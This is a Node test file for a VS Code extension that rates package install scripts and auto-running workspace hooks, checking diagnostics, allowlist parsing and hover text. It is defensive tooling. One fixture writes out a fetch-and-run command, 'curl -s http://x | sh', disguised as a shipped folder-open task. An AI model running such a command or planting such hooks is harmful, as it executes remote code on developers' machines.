'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const {
  findDepLine, findYamlKeyLine, diagnosticsForPackageJson, diagnosticsForWorkspaceYaml,
  summarize, parseAudit, readDecisions, decisionFor, parseAllowBuilds, stateFor,
  condenseSignals, readableSignal, messageFor, explainFor, capabilitiesOf, projectDirOf, ACTIONS_SLOT,
} = require('../src/core');
const nodePath = require('node:path');

const PKG = `{
  "name": "app",
  "version": "1.0.0",
  "dependencies": {
    "sharp": "^0.33.5",
    "chalk": "^5.3.0",
    "noop-hooks": "^1.0.0"
  },
  "devDependencies": {
    "esbuild": "^0.17.19"
  }
}
`;

const RESULTS = [
  { name: 'sharp', version: '0.33.5', risk: 'HIGH', rows: [{ signals: ['exec: node-gyp rebuild', "exec: require('child_process')"] }] },
  { name: 'esbuild', version: '0.17.19', risk: 'HIGH', rows: [{ signals: ['exec: node install.js'] }] },
  { name: 'chalk', version: '5.3.0', risk: 'SAFE', rows: [] }, // no scripts → no diagnostic
  // runs an install script, but it analyzed clean → status bar only, no squiggle
  { name: 'noop-hooks', version: '1.0.0', risk: 'SAFE', rows: [{ signals: [] }] },
  { name: 'evilpkg', version: '9.9.9', malicious: true, advisories: ['MAL-2026-1'], rows: [] },
];

// what `allow` would recommend for RESULTS: HIGH is never auto-approved
const RECOMMENDED = {
  'sharp@0.33.5': false, 'esbuild@0.17.19': false, 'noop-hooks@1.0.0': true, 'evilpkg@9.9.9': false,
};

const withAllow = (allowScripts) => JSON.stringify({ ...JSON.parse(PKG), allowScripts }, null, 2);
const byName = (diags) => Object.fromEntries(diags.map((d) => [d.name, d]));

test('findDepLine locates a dependency across sections; -1 when absent', () => {
  assert.strictEqual(findDepLine(PKG, 'sharp'), 4);
  assert.strictEqual(findDepLine(PKG, 'esbuild'), 9);
  assert.strictEqual(findDepLine(PKG, 'not-here'), -1);
  // must not partial-match a substring name
  assert.strictEqual(findDepLine('{\n  "dependencies": { "sharp-clone": "1" }\n}', 'sharp'), -1);
});

test('findYamlKeyLine locates quoted and unquoted allowlist keys', () => {
  const y = 'allowBuilds:\n  core-js: true\n  "@scope/x": false\n';
  assert.strictEqual(findYamlKeyLine(y, 'core-js'), 1);
  assert.strictEqual(findYamlKeyLine(y, '@scope/x'), 2);
  assert.strictEqual(findYamlKeyLine(y, 'missing'), -1);
});

// --- reading decisions out of each manager's native format -----------------

test('readDecisions understands all four managers', () => {
  const npm = readDecisions('{"allowScripts":{"sharp@0.33.5":true,"esbuild@0.17.19":false}}');
  assert.strictEqual(decisionFor(npm, 'sharp', '0.33.5'), true);
  assert.strictEqual(decisionFor(npm, 'esbuild', '0.17.19'), false);
  assert.strictEqual(decisionFor(npm, 'sharp', '0.34.0'), undefined, 'npm keys by exact version');

  const bare = readDecisions('{"allowScripts":{"sharp":true}}');
  assert.strictEqual(decisionFor(bare, 'sharp', '0.33.5'), true, 'bare-name npm keys still match');

  const yarn = readDecisions('{"dependenciesMeta":{"sharp":{"built":true},"esbuild":{"built":false},"x":{"optional":true}}}');
  assert.strictEqual(decisionFor(yarn, 'sharp', '0.33.5'), true);
  assert.strictEqual(decisionFor(yarn, 'esbuild', '0.17.19'), false);
  assert.strictEqual(decisionFor(yarn, 'x', '1.0.0'), undefined, 'dependenciesMeta without `built` is not a decision');

  const bun = readDecisions('{"trustedDependencies":["sharp"]}');
  assert.strictEqual(decisionFor(bun, 'sharp', '0.33.5'), true);
  // bun has no way to spell a denial, so absence must stay undecided, not denied
  assert.strictEqual(decisionFor(bun, 'esbuild', '0.17.19'), undefined);

  const pnpm = readDecisions('{}', 'packages:\n  - a\nallowBuilds:\n  sharp: true\n  "@s/x": false\n');
  assert.strictEqual(decisionFor(pnpm, 'sharp', '0.33.5'), true);
  assert.strictEqual(decisionFor(pnpm, '@s/x', '1.0.0'), false);
});

test('an allowlist file resolves to its own directory, not the workspace root', () => {
  assert.strictEqual(projectDirOf(nodePath.join('repo', 'apps', 'web', 'package.json')), nodePath.join('repo', 'apps', 'web'));
  assert.strictEqual(projectDirOf(nodePath.join('repo', 'pnpm-workspace.yaml')), 'repo');
  assert.strictEqual(projectDirOf(nodePath.join('repo', 'src', 'index.ts')), null, 'not an allowlist file, caller falls back');
});

test('two package.json files in one workspace are different projects', () => {
  const a = projectDirOf(nodePath.join('repo', 'apps', 'web', 'package.json'));
  const b = projectDirOf(nodePath.join('repo', 'apps', 'api', 'package.json'));
  assert.notStrictEqual(a, b, 'grouping these together is what audited the wrong lockfile');
});

test('parseAudit reads a single discovered project, and refuses several', () => {
  const one = JSON.stringify({ projects: [{ project: '.', results: [{ name: 'a', version: '1' }], allowScripts: { 'a@1': false } }] });
  assert.deepStrictEqual(parseAudit(one).results, [{ name: 'a', version: '1' }]);
  assert.deepStrictEqual(parseAudit(one).recommended, { 'a@1': false });
  const many = JSON.stringify({ projects: [{ project: 'a', results: [] }, { project: 'b', results: [] }] });
  assert.strictEqual(parseAudit(many), null, 'several projects cannot paint one file');
});

test('a denial wins over a trust recorded in another manager', () => {
  // a repo that has used two managers keeps two allowlists, and they can
  // disagree. Resolving to "allowed" would re-enable a deliberately blocked
  // script, so the safe direction has to stick regardless of read order
  const bunLifts = readDecisions(JSON.stringify({ allowScripts: { sharp: false }, trustedDependencies: ['sharp'] }));
  assert.strictEqual(decisionFor(bunLifts, 'sharp', '0.33.5'), false);

  const pnpmLifts = readDecisions(JSON.stringify({ allowScripts: { sharp: false } }), 'allowBuilds:\n  sharp: true\n');
  assert.strictEqual(decisionFor(pnpmLifts, 'sharp', '0.33.5'), false);

  // and in the other order: pnpm denies what package.json trusted
  const pnpmDenies = readDecisions(JSON.stringify({ trustedDependencies: ['sharp'] }), 'allowBuilds:\n  sharp: false\n');
  assert.strictEqual(decisionFor(pnpmDenies, 'sharp', '0.33.5'), false);
});

test('readDecisions degrades to "nothing decided" on unparseable package.json', () => {
  const d = readDecisions('{ "allowScripts": { "sharp@0.33.5": true,,, ');
  assert.strictEqual(decisionFor(d, 'sharp', '0.33.5'), undefined,
    'a mid-edit file must not be read as blanket approval');
});

test('parseAllowBuilds reads only its own block and stops at the dedent', () => {
  const y = 'allowBuilds:\n  a: true\n  b: false\nonlyBuiltDependencies:\n  - c\n';
  assert.deepStrictEqual(parseAllowBuilds(y), { a: true, b: false });
  assert.deepStrictEqual(parseAllowBuilds('packages:\n  - x\n'), {});
  assert.deepStrictEqual(parseAllowBuilds(''), {});
});

// --- the decision matrix ---------------------------------------------------

test('stateFor crosses behavioral risk with the recorded decision', () => {
  const high = RESULTS[0]; // sharp, HIGH
  const safe = RESULTS[3]; // noop-hooks, SAFE with a script
  const evil = RESULTS[4];
  const map = (entries) => new Map(Object.entries(entries));

  assert.strictEqual(stateFor(high, new Map(), RECOMMENDED), 'decide', 'undecided HIGH is the actionable case');
  assert.strictEqual(stateFor(high, map({ 'sharp@0.33.5': true }), RECOMMENDED), 'override');
  assert.strictEqual(stateFor(high, map({ 'sharp@0.33.5': false }), RECOMMENDED), 'blocked');
  assert.strictEqual(stateFor(safe, map({ 'noop-hooks@1.0.0': true }), RECOMMENDED), 'settled');
  assert.strictEqual(stateFor(safe, new Map(), RECOMMENDED), 'quiet', 'a clean script is not a question');
  assert.strictEqual(stateFor(RESULTS[2], new Map(), RECOMMENDED), 'quiet', 'no install script at all');
  // an allowlist entry predates the advisory, so it can never silence OSV
  assert.strictEqual(stateFor(evil, map({ 'evilpkg@9.9.9': true }), RECOMMENDED), 'alarm');
});

test('an allowlisted package produces no warning, only an override marker', () => {
  const decided = withAllow({ 'sharp@0.33.5': true, 'esbuild@0.17.19': true });
  const diags = byName(diagnosticsForPackageJson(decided, RESULTS, { recommended: RECOMMENDED }));
  assert.strictEqual(diags.sharp.state, 'override');
  assert.strictEqual(diags.sharp.severity, 'information', 'a settled risk acceptance is not a warning');
  assert.ok(diags.sharp.message.includes('Your allowlist approves it'));
  assert.ok(diags.sharp.explain.includes('node-gyp'), 'the raw evidence is still one hover away');
});

test('denying a package silences it entirely: the script never runs', () => {
  const denied = withAllow({ 'sharp@0.33.5': false, 'esbuild@0.17.19': false });
  assert.deepStrictEqual(diagnosticsForPackageJson(denied, RESULTS, { recommended: RECOMMENDED }), []);
});

test('undecided packages warn, and say what to do about it', () => {
  const diags = byName(diagnosticsForPackageJson(PKG, RESULTS, { recommended: RECOMMENDED }));
  assert.strictEqual(diags.sharp.state, 'decide');
  assert.strictEqual(diags.sharp.severity, 'warning');
  assert.ok(diags.sharp.message.includes('You have not approved or blocked it yet'), 'the message says what is outstanding');
  assert.ok(diags.sharp.message.includes('runs other programs'), 'and what the script does, in words');
  assert.ok(diags.esbuild && diags.esbuild.line === 9);
  assert.ok(!diags.chalk, 'package with no install script produces no diagnostic');
  assert.ok(!diags['noop-hooks'], 'install script that analyzed SAFE produces no diagnostic');
  assert.ok(!diags.evilpkg, 'malicious package not in package.json text is skipped (no line)');
});

test('decisions default to the document itself when none are passed', () => {
  const decided = withAllow({ 'sharp@0.33.5': true, 'esbuild@0.17.19': true });
  // no `decisions` option: npm/yarn/bun keep the allowlist in this very file
  const states = diagnosticsForPackageJson(decided, RESULTS).map((d) => d.state);
  assert.deepStrictEqual(states, ['override', 'override']);
});

test('diagnostics carry no source suffix, because extension.js sets diag.source', () => {
  for (const d of diagnosticsForPackageJson(PKG, RESULTS, { recommended: RECOMMENDED })) {
    assert.ok(!d.message.includes('(npm-script-lens)'), `${d.name} duplicates the diagnostic source`);
  }
});

test('malicious package in the manifest is an error, allowlisted or not', () => {
  const pkg = '{\n  "dependencies": {\n    "evilpkg": "9.9.9"\n  },\n  "allowScripts": { "evilpkg@9.9.9": true }\n}\n';
  const [d] = diagnosticsForPackageJson(pkg, RESULTS);
  assert.strictEqual(d.name, 'evilpkg');
  assert.strictEqual(d.severity, 'error');
  assert.strictEqual(d.state, 'alarm');
  assert.ok(d.message.includes('reported malicious') && d.message.includes('MAL-2026-1'));
  assert.ok(d.message.includes('Allowlisting cannot make it safe'));
});

test('a package that could not be analyzed still surfaces, at any risk label', () => {
  const pkg = '{\n  "dependencies": {\n    "broken": "1.0.0"\n  }\n}\n';
  const one = (risk) => diagnosticsForPackageJson(pkg,
    [{ name: 'broken', version: '1.0.0', risk, error: 'tarball 404', rows: [] }])[0];
  // what the CLI actually emits (reporter.packageRisk → 'ERROR')
  assert.strictEqual(one('ERROR').severity, 'information');
  assert.ok(one('ERROR').message.includes('could not be analyzed (tarball 404)'));
  assert.ok(one('ERROR').message.includes('unknown'), 'an unanalyzed package is not reported as clean');
  // ...and the SAFE-drop rule must never swallow a fetch failure. "we could not
  // find out what this does" must not render as a Hint just because the risk
  // field defaulted to SAFE. A Hint is a dotted underline nobody reads.
  assert.strictEqual(one('SAFE').severity, 'information',
    'an un-analyzable package is an open question, not a near-invisible hint');
});

test('transitive packages anchor on the direct dependency that pulled them in', () => {
  // most install-time risk is never a line in your package.json
  const deep = { name: 'protobufjs', version: '7.6.5', risk: 'HIGH', via: ['sharp'], rows: [{ signals: ['exec: node install.js'] }] };
  const [d] = diagnosticsForPackageJson(PKG, [deep], { recommended: {} });
  assert.strictEqual(d.line, findDepLine(PKG, 'sharp'), 'anchored on the direct dep, not dropped');
  assert.deepStrictEqual(d.via, ['sharp']);
  assert.ok(d.message.includes('protobufjs@7.6.5 (pulled in by sharp)'), 'the message names the path in');

  // a package reachable from nothing in this manifest still has nowhere to go
  const orphan = { ...deep, via: ['not-a-dep'] };
  assert.deepStrictEqual(diagnosticsForPackageJson(PKG, [orphan], { recommended: {} }), []);
});

test('every counted package has somewhere to be seen', () => {
  // the status bar and the squiggles must not disagree: if summarize() says
  // two things need review, two diagnostics have to exist to click on
  const results = [
    { name: 'sharp', version: '0.33.5', risk: 'HIGH', rows: [{ signals: ['exec: node-gyp rebuild'] }] },
    { name: 'protobufjs', version: '7.6.5', risk: 'HIGH', via: ['esbuild'], rows: [{ signals: ['exec: node install.js'] }] },
  ];
  const sum = summarize(results, { recommended: {} });
  const diags = diagnosticsForPackageJson(PKG, results, { recommended: {} });
  assert.strictEqual(sum.undecided, 2);
  assert.strictEqual(diags.length, 2, 'a counted package with no squiggle is unfindable');
});

// --- pnpm: decisions live in a second file ---------------------------------

test('diagnosticsForWorkspaceYaml anchors overrides on their allowBuilds line', () => {
  const yaml = 'packages:\n  - "."\nallowBuilds:\n  esbuild: true\n  sharp: true\n';
  const diags = byName(diagnosticsForWorkspaceYaml(yaml, RESULTS, { recommended: RECOMMENDED }));
  assert.strictEqual(diags.sharp.line, 4);
  assert.strictEqual(diags.sharp.state, 'override');
  assert.strictEqual(diags.esbuild.line, 3);
  assert.ok(!diags.evilpkg, 'malicious package with no allowBuilds line has nothing to anchor to');
});

test('a pnpm denial in the yaml clears the package.json warning too', () => {
  const yaml = 'allowBuilds:\n  sharp: false\n  esbuild: false\n';
  const decisions = readDecisions(PKG, yaml);
  assert.deepStrictEqual(
    diagnosticsForPackageJson(PKG, RESULTS, { recommended: RECOMMENDED, decisions }), [],
  );
  assert.deepStrictEqual(diagnosticsForWorkspaceYaml(yaml, RESULTS, { recommended: RECOMMENDED }), [],
    'denied entries are not overrides');
});

// --- signal rendering ------------------------------------------------------

test('readableSignal renders gyp macro syntax as plain $VAR', () => {
  assert.strictEqual(
    readableSignal('gyp: actions[].action node copy.js <(SHARED_INTERMEDIATE_DIR)/sqlite3'),
    'gyp: actions[].action node copy.js $SHARED_INTERMEDIATE_DIR/sqlite3',
  );
  assert.strictEqual(readableSignal('gyp: >!(node -p x) <@(deps)'), 'gyp: $node -p x $deps');
  assert.strictEqual(readableSignal('exec: prebuild-install'), 'exec: prebuild-install');
});

test('condenseSignals drops repeats and longer spellings of the same command', () => {
  // real better-sqlite3 shape: gyp emits the same action twice, once with extra args
  const rows = [{
    signals: [
      'exec: node-gyp rebuild --release',
      'exec: prebuild-install',
      'gyp: actions[].action node copy.js <(SHARED_INTERMEDIATE_DIR)/sqlite3',
      'gyp: actions[].action node copy.js <(SHARED_INTERMEDIATE_DIR)/sqlite3 <(sqlite3)',
    ],
  }];
  assert.deepStrictEqual(condenseSignals(rows), [
    'exec: node-gyp rebuild --release',
    'exec: prebuild-install',
    'gyp: actions[].action node copy.js $SHARED_INTERMEDIATE_DIR/sqlite3',
  ]);
  // shortest spelling wins regardless of arrival order, and exact repeats collapse
  assert.deepStrictEqual(
    condenseSignals([{ signals: ['exec: a b c', 'exec: a', 'exec: a b', 'exec: a'] }]),
    ['exec: a'],
  );
  // a longer signal that merely shares a prefix within a word is not a repeat
  assert.deepStrictEqual(
    condenseSignals([{ signals: ['fs: read', 'fs: readFile'] }]),
    ['fs: read', 'fs: readFile'],
  );
});

// --- plain English ---------------------------------------------------------

test('capabilitiesOf groups signals by what they let the script do, strongest first', () => {
  const caps = capabilitiesOf([{ signals: ['fs: chmodSync', 'env: process.env', 'exec: sw_vers', 'exec: npm install'] }]);
  assert.deepStrictEqual(caps.map((c) => c.kind), ['exec', 'fs', 'env'], 'ordered as analyzer score() checks them');
  assert.deepStrictEqual(caps[0].examples, ['sw_vers', 'npm install'], 'the raw signals survive as evidence');
  assert.deepStrictEqual(capabilitiesOf([{ signals: ['weird thing'] }]), [],
    'an unrecognised prefix is not invented into a capability');
});

test('a runtime bootstrap leads the explanation, ahead of the exec it also does', () => {
  const caps = capabilitiesOf([{ signals: [
    'bootstrap: bun fetched from oven-sh/bun releases, then runs stage2.js',
    "exec: require('child_process')", 'net: fetch()', 'env: process.env',
  ] }]);
  assert.deepStrictEqual(caps.map((c) => c.kind), ['bootstrap', 'exec', 'net', 'env']);
  assert.strictEqual(caps[0].does, 'installs another JavaScript runtime');
  assert.match(caps[0].examples[0], /oven-sh\/bun releases/);
});

test('messageFor says what the script can do, not which functions it calls', () => {
  const esbuild = {
    name: 'esbuild',
    version: '0.27.3',
    risk: 'HIGH',
    rows: [{ signals: ['env: process.env', 'exec: child_process.execFileSync()', 'fs: fs2.chmodSync', 'net: fetch()'] }],
  };
  const msg = messageFor(esbuild, 'decide', ['vite']);
  assert.ok(msg.startsWith('esbuild@0.27.3 (pulled in by vite) runs code when you install it'), msg);
  assert.ok(msg.includes('runs other programs, uses the network and reads and writes files'), msg);
  assert.ok(!msg.includes('execFileSync'), 'raw signals belong in the hover, not in the squiggle');
  assert.ok(!msg.includes('environment variables'), 'capabilities are capped at the three that set the risk');
  assert.ok(msg.endsWith('You have not approved or blocked it yet.'), msg);
});

test('explainFor carries the evidence and says why the risk landed where it did', () => {
  const sharp = {
    name: 'sharp',
    version: '0.33.5',
    risk: 'HIGH',
    rows: [{ signals: ['exec: node-gyp rebuild', 'exec: prebuild-install', 'exec: sw_vers', 'env: process.env'] }],
  };
  const md = explainFor(sharp, 'decide', ['vite']);
  assert.ok(md.includes('`vite` pulls it in'), md);
  assert.ok(md.includes('`node-gyp rebuild`') && md.includes('+1 more'), md);
  assert.ok(md.includes('Rated **HIGH**: it runs other programs'), md);
  assert.ok(md.includes('**What to do**'), 'every explanation ends in something to do');

  // the risk driver is whichever capability scored it, never just the first signal seen
  const netOnly = explainFor({ name: 'x', version: '1', risk: 'MEDIUM', rows: [{ signals: ['fs: writeFile', 'net: fetch()'] }] });
  assert.ok(netOnly.includes('Rated **MEDIUM**: it uses the network'), netOnly);

  // The decide buttons sit right under the opening sentence, and everything
  // below them is optional reading. Screenshots of the finished hover showed
  // it clipped by the hover height cap with only about six lines visible, so
  // anything further down is something a reader may simply never see.
  const slotAt = md.indexOf(ACTIONS_SLOT);
  assert.ok(slotAt > md.indexOf('Installing it runs'), 'buttons must follow the opening sentence');
  assert.ok(slotAt < md.indexOf('- runs other programs'), 'buttons must precede the evidence list');
  assert.ok(slotAt < md.indexOf('**What to do**'), 'buttons must precede the closing prose');
  assert.ok(md.split('\n').length <= 18, `hover is ${md.split('\n').length} lines, it will be clipped`);
});

// --- status bar ------------------------------------------------------------

test('summarize leads with the number that needs a decision', () => {
  const sum = summarize(RESULTS, { recommended: RECOMMENDED });
  assert.strictEqual(sum.bad, 3, 'evilpkg malicious + sharp + esbuild HIGH');
  assert.ok(sum.text.includes('malicious'), 'malicious dominates the summary');

  const noEvil = RESULTS.filter((r) => !r.malicious);
  assert.strictEqual(summarize(noEvil, { recommended: RECOMMENDED }).text, '2 install scripts to review');
  assert.strictEqual(summarize(noEvil, { recommended: RECOMMENDED }).undecided, 2);
  assert.strictEqual(summarize([]).text, 'no install scripts');
});

test('summarize goes quiet once every scripted dep is decided', () => {
  const noEvil = RESULTS.filter((r) => !r.malicious);
  const decisions = readDecisions(withAllow({ 'sharp@0.33.5': true, 'esbuild@0.17.19': true, 'noop-hooks@1.0.0': true }));
  const sum = summarize(noEvil, { recommended: RECOMMENDED, decisions });
  assert.strictEqual(sum.undecided, 0);
  assert.strictEqual(sum.overrides, 2);
  assert.strictEqual(sum.scripted, 3);
  assert.strictEqual(sum.text, '3 install scripts, all decided (2 overrides)');
});

test('summarize counts SAFE scripted deps, which never get a diagnostic', () => {
  const safeScripted = [
    { name: 'a', version: '1', risk: 'SAFE', rows: [{ signals: [] }] },
    { name: 'b', version: '1', risk: 'SAFE', rows: [{ signals: [] }] },
    { name: 'c', version: '1', risk: 'SAFE', rows: [] }, // no install script at all
  ];
  const sum = summarize(safeScripted);
  assert.strictEqual(sum.counts.SAFE, 2);
  assert.strictEqual(sum.scripted, 2);
  assert.strictEqual(sum.bad, 0);
  assert.strictEqual(sum.text, '2 install scripts, all decided');
  assert.strictEqual(summarize([safeScripted[0]]).text, '1 install script, all decided');
});

// --- CLI envelope ----------------------------------------------------------

test('parseAudit keeps the recommendation alongside the results', () => {
  const out = 'auditing 5 packages\n{"results":[{"name":"a","version":"1","risk":"LOW","rows":[]}],"allowScripts":{"a@1":true}}';
  const parsed = parseAudit(out);
  assert.strictEqual(parsed.results.length, 1);
  assert.deepStrictEqual(parsed.recommended, { 'a@1': true },
    'the recommendation is what makes an override detectable');
  assert.strictEqual(parseAudit('npm ERR broke'), null);
  assert.deepStrictEqual(parseAudit('{"results":[]}').recommended, {}, 'missing allowScripts is not a crash');
});

// --- open-time hooks (CLI 1.8.0 `hooks --json`) -----------------------------

const { isHookFile, parseHooks, hookMessage, hookExplain, diagnosticsForHooksFile } = require('../src/core');

const HOOK_FINDINGS = [
  { file: '.vscode/tasks.json', line: 4, surface: 'vscode-task', kind: 'command', auto: true, label: 'eslint-check', command: 'node .vscode/setup.mjs', silent: true, signals: ['exec: node .vscode/setup.mjs (file not present)'], risk: 'HIGH' },
  { file: '.claude/settings.json', line: 3, surface: 'claude-hook', event: 'SessionStart', kind: 'command', auto: true, command: 'node .claude/setup.mjs', signals: [], risk: 'HIGH' },
  { file: '.claude/settings.json', line: 7, surface: 'claude-hook', event: 'PreToolUse', kind: 'command', auto: false, command: 'node check.js', signals: [], risk: 'MEDIUM' },
  { file: '.claude/settings.json', line: 9, surface: 'claude-hook', event: 'SessionStart', kind: 'http', auto: true, target: 'https://collector.example', risk: 'INFO' },
];

test('isHookFile matches the two surfaces at any depth, with either separator', () => {
  assert.ok(isHookFile('.vscode/tasks.json'));
  assert.ok(isHookFile(String.raw`D:\repo\.claude\settings.json`));
  assert.ok(isHookFile('/repo/packages/app/.vscode/tasks.json'));
  assert.ok(!isHookFile('package.json'));
  assert.ok(!isHookFile('.vscode/settings.json'), 'vscode settings.json is not a surface');
  assert.ok(!isHookFile('.claude/settings.local.json'), 'machine-local file is out of scope');
});

test('parseHooks tolerates leading log noise, rejects non-hooks JSON', () => {
  const parsed = parseHooks('scanning…\n{"findings":[{"file":"x","risk":"HIGH"}],"partial":[]}');
  assert.strictEqual(parsed.findings.length, 1);
  assert.deepStrictEqual(parsed.partial, []);
  assert.strictEqual(parseHooks('npm ERR broke'), null);
  assert.strictEqual(parseHooks('{"results":[]}'), null, 'audit JSON is not hooks JSON');
});

test('diagnosticsForHooksFile: HIGH is a warning on the 0-based line, only for its own file', () => {
  const vs = diagnosticsForHooksFile('.vscode/tasks.json', HOOK_FINDINGS);
  assert.strictEqual(vs.length, 1);
  assert.strictEqual(vs[0].line, 3);
  assert.strictEqual(vs[0].severity, 'warning');
  assert.ok(vs[0].message.includes('Opening this folder runs the task “eslint-check”'));
  assert.ok(vs[0].message.includes('with no terminal shown'), 'reveal: silent is called out');

  const cl = diagnosticsForHooksFile('.claude/settings.json', HOOK_FINDINGS);
  assert.strictEqual(cl.length, 3);
  assert.strictEqual(cl[0].severity, 'warning');
  assert.ok(cl[0].message.includes('next Claude Code session'), cl[0].message);
  const pre = cl.find((d) => d.message.includes('PreToolUse'));
  assert.strictEqual(pre.severity, 'information', 'agent-triggered tiers below warning');
  assert.ok(pre.message.includes('agent-triggered'));
  const http = cl.find((d) => d.message.includes('http hook'));
  assert.strictEqual(http.severity, 'information');
  assert.ok(http.message.includes('does not run a shell command'));
});

test('diagnosticsForHooksFile: a partial file gets one note, warning when rawHit', () => {
  const partials = [
    { file: '.vscode/tasks.json', note: 'did not parse, raw text mentions "folderOpen"', rawHit: true },
    { file: '.claude/settings.json', note: 'did not parse as JSON/JSONC', rawHit: false },
  ];
  const vs = diagnosticsForHooksFile('.vscode/tasks.json', [], partials);
  assert.strictEqual(vs.length, 1);
  assert.strictEqual(vs[0].line, 0);
  assert.strictEqual(vs[0].severity, 'warning');
  const cl = diagnosticsForHooksFile('.claude/settings.json', [], partials);
  assert.strictEqual(cl[0].severity, 'information');
});

test('hookMessage: shipped-in-dependency findings say so', () => {
  const f = { surface: 'vscode-task', label: 'eslint-check', command: 'curl -s http://x | sh', risk: 'HIGH', fromDep: 'evil-open@1.0.0', signals: ['net: curl -s http://x'] };
  const msg = hookMessage(f);
  assert.ok(msg.includes('it shipped inside evil-open@1.0.0'), msg);
  assert.ok(msg.includes('It uses the network.'), msg);
  const md = hookExplain(f);
  assert.ok(md.includes('curl -s http://x | sh'), 'the command itself is the evidence');
  assert.ok(md.includes('**evil-open@1.0.0**') && md.includes('**What to do**'), md);
});
